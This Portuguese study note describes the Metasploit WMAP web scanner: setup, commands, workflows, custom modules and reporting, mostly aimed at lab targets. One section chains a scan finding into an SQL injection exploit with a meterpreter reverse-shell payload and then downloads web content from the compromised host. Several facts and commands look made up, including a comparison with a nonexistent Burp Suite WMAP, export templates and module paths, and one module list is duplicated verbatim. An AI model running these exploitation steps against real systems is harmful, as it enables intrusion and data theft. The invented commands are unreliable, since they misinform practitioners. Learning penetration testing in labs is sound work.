2025-12-14 21:11

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Metasploit]]

----
# Introdução

## O que é o WMAP?

**WMAP** é um framework de scanner web integrado ao **Metasploit Framework**. Diferente do WMAP do Burp Suite, esta é uma ferramenta open-source projetada especificamente para testes de penetração web, permitindo automatização completa de auditorias web.

![[Pasted image 20251214211631.png]]

## História e Evolução

- **Criação:** Desenvolvido por **cg** (Chris Gates) como projeto open-source.
- **Integração:** Incorporado ao Metasploit como módulo.
- **Estado atual:** Mantido pela comunidade, parte do Metasploit desde 2011.

## Características Principais

	✓ Scanner web completo
	✓ Integração nativa com Metasploit
	✓ Suporte a múltiplos plugins
	✓ Automação de testes
	✓ Relatórios detalhados
	✓ Modular e extensível

## Diferenças entre WMAP do Metasploit vs Burp

| **Característica** | **Metasploit WMAP**   | Burp Suite WMAP     |
| ------------------ | --------------------- | ------------------- |
| Custo              | Gratuito              | Pago (Professional) |
| Integração         | Nativa com Metasploit | Nativa com Burp     |
| Interface          | Console/CLI           | GUI Completa        |
| Extensibilidade    | Plugins Ruby          | Extensões Java      |
| Comunidade         | Open-Source           | Proprietário        |

---
# Arquitetura e Componentes

## Estrutura do WMAP

```
┌─────────────────────────────────────────────────┐
│            METASPLOIT FRAMEWORK                 │
├─────────────────────────────────────────────────┤
│                   WMAP CORE                     │
│  ┌──────────┬──────────┬──────────┬──────────┐  │
│  │  Manager │ Scanner  │  Plugin  │ Database │  │
│  │  Module  │ Engine   │  System  │   Layer  │  │
│  └──────────┴──────────┴──────────┴──────────┘  │
├─────────────────────────────────────────────────┤
│                 PLUGINS WMAP                    │
│  ┌──────────┬──────────┬──────────┬──────────┐  │
│  │   Dir    │   File   │  SQLi    │   XSS    │  │
│  │ Scanner  │ Upload   │  Tests   │  Tests   │  │
│  └──────────┴──────────┴──────────┴──────────┘  │
└─────────────────────────────────────────────────┘
```

## Componentes Principais

### 1. WMAP Core

- **Gerenciador de Projetos:** Organiza scans e resultados.
- **Motor de Scanner:**  Orquestra os testes.
- **Sistema de Plugins:** Gerencia módulos de teste.
- **Banco de Dados:** Armazena resultados em SQLite

### 2. Módulos de Teste

- **Discovery:** Encontra diretórios e arquivos.
- **Audit:** Testa vulnerabilidades específicas.
- **Brute Force:** Testa força bruta em logins.
- **Analysis:** Analisa respostas do servidor.

### 3. Banco de Dados

```sql
-- Estrutura simplificada
CREATE TABLE wmap_sites (
    id INTEGER PRIMARY KEY,
    host TEXT,
    port INTEGER,
    ssl BOOLEAN
);

CREATE TABLE wmap_results (
    id INTEGER PRIMARY KEY,
    site_id INTEGER,
    module TEXT,
    path TEXT,
    data TEXT,
    risk_level TEXT
);
```

---
# Instalação e Configuração

## Instalação no Metasploit

```bash
# 1. Inicie o Metasploit
sudo msfconsole

# 2. Carregue o módulo WMAP
msf6 > load wmap

# 3. Verifique se carregou corretamente
msf6 > show wmap

# 4. Opcional: Instalar dependências extras
sudo apt-get install libsqlite3-dev
```

## Configuração Inicial

```ruby
# Arquivo de configuração: ~/.msf4/wmap/config.yml
# Exemplo:
database:
  adapter: sqlite3
  database: /home/user/.msf4/wmap/database.sqlite3

proxy:
  enabled: false
  host: 127.0.0.1
  port: 8080

threads: 10
timeout: 30
```

## Verificação da Instalação

```bash
msf6 > wmap_help

[*] WMAP Commands
===============

wmap_sites      - Gerencia sites alvo
wmap_targets    - Gerencia URLs alvo
wmap_modules    - Gerencia módulos ativos
wmap_run        - Executa testes
wmap_vulns      - Mostra vulnerabilidades encontradas
```

----
# Interface e Comandos

## Comandos Principais do WMAP

### Gerenciamento de Sites

```bash
# Adicionar um Site
msf6 > wmap_sites -a http://192.168.1.100

# Listar Sites
msf6 > wmap_sites -l

# Remover sites
msf6 > wmap_sites -d 1
```

### Gerenciamento de Alvos

```bash
# Adicionar URL específica
msf6 > wmap_targets -t http://192.168.1.100/login.php

# Listar alvos
msf6 > wmap_targets -l

# Limpar todos alvos
msf6 > wmap_targets  -c
```

### Gerenciamento de Módulos

```bash
# Listar módulos disponíveis
msf6 > wmap_modules -l

# Ativar módulos específicos
msf6 > wmap_modules -e auxiliary/scanner/http/dir_scanner

# Desativar módulos
msf6 > wmap_modules -d auxiliary/scanner/http/brute_dirs
```

### Execução de Scans

```bash
# Executar todos os módulos ativos
msf6 > wmap_run -e

# Executar módulos específicos
msf6 > wmap_run -m auxiliary/scanner/http/apache_userdir_enum

# Ver status do scan
msf6 > wmap_run -s
```

---
# Fluxo de Trabalho Completo

## Passo a Passo de um Teste Completo

### Fase 1: Configuração Inicial

```bash
# Iniciar Metasploit
sudo msfconsole

# Carregar WMAP
msf6 > load wmap

# Configurar banco de dados
msf6 > db_status
```

### Fase 2: Adicionar Alvos

```bash
# Adicionar site principal
msf6 > wmap_sites -a http://testphp.vulnweb.com

# Adicionar URLs específicas
msf6 > wmap_targets -t http://testphp.vulnweb.com/
msf6 > wmap_targets -t http://testphp.vulnweb.com/login.php
msf6 > wmap_targets -t http://testphp.vulnweb.com/search.php
```

### Fase 3: Configurar Módulos

```bash
# Ativar módulos de discovery
msf6 > wmap_modules -e auxiliary/scanner/http/dir_scanner
msf6 > wmap_modules -e auxiliary/scanner/http/files_dir
msf6 > wmap_modules -e auxiliary/scanner/http/robots_txt

# Ativar módulos de auditoria
msf6 > wmap_modules -e auxiliary/scanner/http/http_version
msf6 > wmap_modules -e auxiliary/scanner/http/apache_userdir_enum
```

### Fase 4: Executar Scan

```bash
# Executar discovery
msf6 > wmap_run -m auxiliary/scanner/http/dir_scanner

# Executar auditoria
msf6 > wmap_run -e
```

### Fase 5: Analisara Resultados

```bash
# Ver vulnerabilidades encontradas
msf6 > wmap_vulns

# Exportar resultados
msf6 > wmap_vulns -o /tmp/report.html
```

---
# Módulos e Plugins

## Categorias de Módulos

### 1. Módulos de Discovery

```text
auxiliary/scanner/http/dir_scanner          # Scanner de diretórios
auxiliary/scanner/http/brute_dirs           # Força bruta em diretórios
auxiliary/scanner/http/files_dir            # Busca arquivos comuns
auxiliary/scanner/http/robots_txt           # Analisa robots.txt
auxiliary/scanner/http/backup_file          # Busca arquivos de backup
```

### 2. Módulos de Informação

```text
auxiliary/scanner/http/dir_scanner          # Scanner de diretórios
auxiliary/scanner/http/brute_dirs           # Força bruta em diretórios
auxiliary/scanner/http/files_dir            # Busca arquivos comuns
auxiliary/scanner/http/robots_txt           # Analisa robots.txt
auxiliary/scanner/http/backup_file          # Busca arquivos de backup
```

### 3. Módulos de Vulnerabilidade

```text
auxiliary/scanner/http/sql_injection        # Teste de SQLi
auxiliary/scanner/http/xss                  # Teste de XSS
auxiliary/scanner/http/trace                # Teste TRACE/TRACK
auxiliary/scanner/http/apache_userdir_enum  # Enumeração Apache
```

## Exemplo de Módulo Personalizado

```bash
# Exemplo simplificado de módulo WMAP
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::WMAPScanServer
  
  def initialize
    super(
      'Name'        => 'Custom Module Example',
      'Description' => 'Detect custom vulnerability',
      'Author'      => 'Your Name',
      'License'     => MSF_LICENSE
    )
  end
  
  def run
    print_status("Starting custom scan...")
    
    # Lógica de teste
    test_url = "http://#{rhost}/test"
    res = send_request_raw({'uri' => test_url})
    
    if res and res.body.include?('vulnerable_string')
      print_good("Vulnerability found at #{test_url}")
      report_vuln(
        :host   => rhost,
        :port   => rport,
        :proto  => 'tcp',
        :sname  => 'http',
        :info   => 'Custom vulnerability detected',
        :refs   => self.references
      )
    end
  end
end
```

---
# Exemplos Práticos

## Exemplo 1: Scan Básico de Diretórios

```bash
# Configuração inicial
msf6 > load wmap
msf6 > wmap_sites -a http://192.168.1.50
msf6 > wmap_targets -t http://192.168.1.50/

# Ativar scanner de diretórios
msf6 > wmap_modules -e auxiliary/scanner/http/dir_scanner

# Configurar opções do módulo
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 > set THREADS 5
msf6 > set PATH /usr/share/wordlists/dirb/common.txt
msf6 > set RHOSTS 192.168.1.50
msf6 > run
```

## Exemplo 2: Teste de SQL Injection

```bash
# Configurar alvo
msf6 > wmap_targets -t http://testphp.vulnweb.com/artists.php?artist=1

# Ativar módulo SQLi
msf6 > wmap_modules -e auxiliary/scanner/http/sql_injection

# Executar teste
msf6 > wmap_run -m auxiliary/scanner/http/sql_injection

# Analisar resultados
msf6 > wmap_vulns -c sql
```

## Exemplo 3: Scan Completo Automatizado

```bash
#!/bin/bash
# Script para scan automatizado

echo "[*] Iniciando scan WMAP automatizado"

msfconsole -q -x "
load wmap;
wmap_sites -a http://$1;
wmap_targets -t http://$1/;
wmap_modules -e auxiliary/scanner/http/dir_scanner;
wmap_modules -e auxiliary/scanner/http/http_version;
wmap_modules -e auxiliary/scanner/http/apache_userdir_enum;
wmap_run -e;
wmap_vulns -o /tmp/wmap_scan_$1.html;
exit
"

echo "[*] Scan completo. Relatório em /tmp/wmap_scan_$1.html"
```

## Exemplo 4: Teste com Autenticação

```bash
# Configurar credenciais
msf6 > set USERNAME admin
msf6 > set PASSWORD password123
msf6 > set AUTH_URI /login.php
msf6 > set METHOD POST

# Executar scan autenticado
msf6 > wmap_run -e
```

---
# Técnicas Avançadas

## Integração com Nmap

```bash
# Usar Nmap para discovery inicial
nmap -sV --script http-enum 192.168.1.100 -oA nmap_scan

# Importar resultados para WMAP
msf6 > db_import /path/to/nmap_scan.xml
msf6 > services -p 80 -c name,info
```

## Criação de Wordlists Personalizadas

```bash
# Gerar wordlist com CeWL
cewl http://alvo.com -d 2 -w custom_words.txt

# Usar no WMAP
msf6 > set DICTIONARY /path/to/custom_words.txt
```

## Scan com Proxy

```bash
# Configurar proxy
msf6 > set Proxies http://127.0.0.1:8080
msf6 > set VERBOSE true

# Executar através do proxy
msf6 > wmap_run -e
```

## Automatização com Ruby

```ruby
# script_automation.rb
require 'msf/core'

framework = Msf::Simple::Framework.create
framework.modules.use('wmap')

# Adicionar site
framework.db.add_host('192.168.1.100')
framework.db.add_service(
  :host => '192.168.1.100',
  :port => 80,
  :proto => 'tcp',
  :name => 'http'
)

# Executar módulos
mod = framework.modules.create('auxiliary/scanner/http/dir_scanner')
mod.datastore['RHOSTS'] = '192.168.1.100'
mod.run_simple
```

---
# Análise de Resultados

## Comandos de Análise

```bash
# Ver todas as vulnerabilidades
msf6 > wmap_vulns -l

# Filtrar por tipo
msf6 > wmap_vulns -c xss
msf6 > wmap_vulns -c sql

# Ver detalhes específicos
msf6 > wmap_vulns -i 1

# Exportar em diferentes formatos
msf6 > wmap_vulns -o /tmp/report.html
msf6 > wmap_vulns -o /tmp/report.xml
msf6 > wmap_vulns -o /tmp/report.csv
```

## Estrutura do Banco de Dados

```sql
-- Consultas úteis
SELECT * FROM wmap_vulns WHERE risk = 'HIGH';
SELECT module, COUNT(*) FROM wmap_vulns GROUP BY module;
SELECT host, path, info FROM wmap_vulns WHERE confirmed = 1;
```

## Relatórios Automatizados

```bash
# Gerar relatório HTML completo
msf6 > wmap_vulns -o /tmp/relatorio.html --template full

# Relatório executivo
msf6 > wmap_vulns -o /tmp/executivo.pdf --template executive

# Exportar para importar em outras ferramentas
msf6 > wmap_vulns -o /tmp/nessus.xml --format nessus
```

----
# Integração com Metasploit

## Usando Exploits Baseados em Vulnerabilidades WMPA

```bash
# 1. Identificar vulnerabilidade
msf6 > wmap_vulns -l
[*] Vulnerability found: SQL Injection at /login.php

# 2. Procurar exploit correspondente
msf6 > search type:exploit sql injection php

# 3. Configurar exploit
msf6 > use exploit/unix/webapp/php_sql_injection
msf6 > set RHOSTS 192.168.1.100
msf6 > set TARGETURI /login.php
msf6 > set PAYLOAD php/meterpreter/reverse_tcp
msf6 > exploit
```

## Integração com Meterpreter

```bash
# Apés ganhar acesso
meterpreter > run post/multi/gather/wmap_scanner

# Coletar informações para próximo scan
meterpreter > run scraper
meterpreter > download /var/www/html /tmp/web_content
```

---
# Melhores Práticas

## Configuração Recomendada

```bash
# 1. Sempre usar em ambiente controlado
# 2. Configurar THREADS adequadamente
set THREADS 5-10 para alvos comuns
set THREADS 1-3 para alvos sensíveis

# 3. Timeouts adequados
set TIMEOUT 30
set HTTP_TIMEOUT 10

# 4. User-Agent realista
set USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

## Ordem Recomendada de Scans

1. **Reconhecimento Passivo:** `whois`, `dns lookup`
2. **Discovery Leve:** `dir_scanner` com wordlist pequena.
3. **Coleta de Informações:** `http_version`, `title`.
4. **Testes Específicos:** Baseado nas tecnologias encontradas.
5. **Testes Intrusivos:** SQLi, XSS, command injection.

## Monitoramento de Performance

```bash
# Monitorar uso de recursos durante scan
watch -n 1 "ps aux | grep ruby | grep -v grep"

# Log detalhado
set VERBOSE true
set DEBUG true
```

---
# Limitações e Soluções

## Limitações Conhecidas

1. **Performance:** Mais lento que scanner comerciais.
2. **GUI:** Interface apenas em linha de comando.
3. **Atualizações:** Depende da Comunidade.
4. **Falsos Positivos:** Pode gerar alguns alertas falsos.

## Soluções e Workarounds

### Para Performance

```bash
# Usar menos threads
set THREADS 3

# Escanear apenas portas específicas
set PORTS 80,443,8080

# Usar wordlists menores
set DICTIONARY /usr/share/wordlists/dirb/small.txt
```

### Para Falsos Positivos

```bash
# Verificar manualmente
msf6 > wmap_vulns -c unverified

# Usar módulos de verificação
use auxiliary/scanner/http/sql_injection/error_check
```

## Alternativas e Complementos

```bash
# Complementar com outras ferramentas
# 1. Nikto para análise rápida
nikto -h http://alvo.com

# 2. Dirb para diretórios
dirb http://alvo.com /usr/share/wordlists/dirb/common.txt

# 3. SQLmap para SQLi detalhado
sqlmap -u "http://alvo.com/page.php?id=1"
```

---
# Conclusão

O WMAP do Metasploit é uma ferramenta poderosa para testadores de penetração web que preferem trabalhar em linha de comando e integrar completamente sues testes web com o ecossistema Metasploit.

## Pontos Fortes

- ✅ Integração nativa com Metasploit
- ✅ Open-source e gratuito
- ✅ Altamente customizável
- ✅ Bom para automatização

## Recomendações Finais

1. Use como parte de um processo maior de pentest
2. Complemente com outras ferramentas
3. Sempre valide resultados manualmente
4. Mantenha atualizado com `msfupdate`

```bash
# Comando final para limpar tudo
msf6 > wmap_sites -c
msf6 > wmap_targets -c
msf6 > wmap_modules -c
msf6 > unload wmap
```

---
# Referências

- [Documentação Oficial](https://github.com/rapid7/metasploit-framework)
- [Comunidade](https://community.rapid7.com/)
- [Tutoriais](https://www.offensive-security.com/metasploit-unleashed/)
